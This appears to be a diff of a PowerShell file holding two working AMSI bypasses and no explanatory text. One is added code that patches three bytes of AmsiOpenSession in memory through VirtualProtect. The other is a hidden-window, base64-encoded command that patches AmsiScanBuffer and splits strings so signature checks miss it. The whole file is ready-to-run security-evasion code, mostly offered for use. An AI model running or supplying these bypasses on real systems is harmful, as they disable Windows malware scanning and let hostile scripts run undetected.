@@ -1,3 +1,42 @@
+# Author: Matheus Alexandre, https://www.blazeinfosec.com/post/tearing-amsi-with-3-bytes/
+function lookFuncAddr{
+Param($moduleName, $functionName)
+
+$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
+$tmp=@()
+$assem.GetMethods() | ForEach-Object{If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
+return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function getDelegateType{
+Param(
+[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+[Parameter(Position = 1)] [Type] $delType = [Void]
+)
+
+$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType',
+'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+
+$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+
+return $type.CreateType()
+}
+
+[IntPtr]$amsiAddr = lookFuncAddr amsi.dll AmsiOpenSession
+$oldProtect = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookFuncAddr kernel32.dll VirtualProtect),
+(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+
+$vp.Invoke($amsiAddr, 3, 0x40, [ref]$oldProtect)
+
+$3b = [Byte[]] (0x48, 0x31, 0xC0)
+[System.Runtime.InteropServices.Marshal]::Copy($3b, 0, $amsiAddr, 3)
+
+$vp.Invoke($amsiAddr, 3, 0x20, [ref]$oldProtect)
+
 
 powershell /w 1 /C "sv JD -;sv BF ec;sv Kh ((gv JD).value.toString()+(gv BF).value.toString());powershell (gv Kh).value.toString() ('JABHAHAAegBHAHgAagB6AFgARwBGACAAPQAgAEAAIgAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFcAaQBuADMAMgAgAHsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlACIAKwAiAGwAIgArACIAMwAyACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgASQBuAHQAUAB0AHIAIABoAE0AbwBkAHUAbABlACwAIABzAHQAcgBpAG4AZwAgAHAAcgBvAGMATgBhAG0AZQApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlACIAKwAiAGwAIgArACIAMwAyACIAKQBdACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABMAG8AYQBkAEwAaQBiAHIAYQByAHkAKABzAHQAcgBpAG4AZwAgAG4AYQBtAGUAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQAiACsAIgBsACIAKwAiADMAMgAiACkAXQAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwB9AAoAIgBAAAoAQQBkAGQALQBUAHkAcABlACAAJABHAHAAegBHAHgAagB6AFgARwBGADsAJABzAGIAYQBVAEgASQBMAHMAIAA9ACAAWwBXAGkAbgAzADIAXQA6ADoARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgAWwBXAGkAbgAzADIAXQA6ADoATABvAGEAZABMAGkAYgByAGEAcgB5ACgAIgBBACIAKwAiAG0AIgArACIAcwBpAC4AZABsAGwAIgApACwAIAAiAEEAIgArACIAbQAiACsAIgBzAGkAUwBjAGEAbgBCAHUAIgArACIAZgAiACsAIgBmAGUAcgAiACkAOwAkAHgATAB3AHYAUwB3ACAAPQAgADAAOwBbAFcAaQBuADMAMgBdADoAOgBWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKAAkAHMAYgBhAFUASABJAEwAcwAsACAAWwB1AGkAbgB0ADMAMgBdAFsAdQBpAG4AdAAzADIAXQA1ACwAIAAwAHgANAAwACwAIABbAHIAZQBmAF0AJAB4AEwAdwB2AFMAdwApADsAJABvAHkAUgBNAEUAQQB0AEwAbAB2ACAAPQAgACgAIgB9AHgAUQBwAFgAdQBSACwAIAB9AHgAbwBUAEkAdwBoAEkASABwAEQAQgAsACAAfQB4AH0AfQAsACAAfQB4AH0ANwAsACAAfQB4ADgAfQAsACAAfQB4AEMAMwAiACkALgByAGUAcABsAGEAYwBlACgAIgBvAFQASQB3AGgASQBIAHAARABCACIALAAgACIANQA3ACIAKQAuAHIAZQBwAGwAYQBjAGUAKAAiAH0AIgAsACAAIgAwACIAKQAuAHIAZQBwAGwAYQBjAGUAKAAiAFEAcABYAHUAUgAiACwAIAAiAEIAOAAiACkAOwAkAG8AeQBSAE0ARQBBAHQATABsAHYAIAA9ACAAWwBCAHkAdABlAFsAXQBdACgAJABvAHkAUgBNAEUAQQB0AEwAbAB2ACkALgBzAHAAbABpAHQAKAAiACwAIgApADsAWwBTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoAQwBvAHAAeQAoACQAbwB5AFIATQBFAEEAdABMAGwAdgAsACAAMAAsACAAJABzAGIAYQBVAEgASQBMAHMALAAgADYAKQA=')"
 
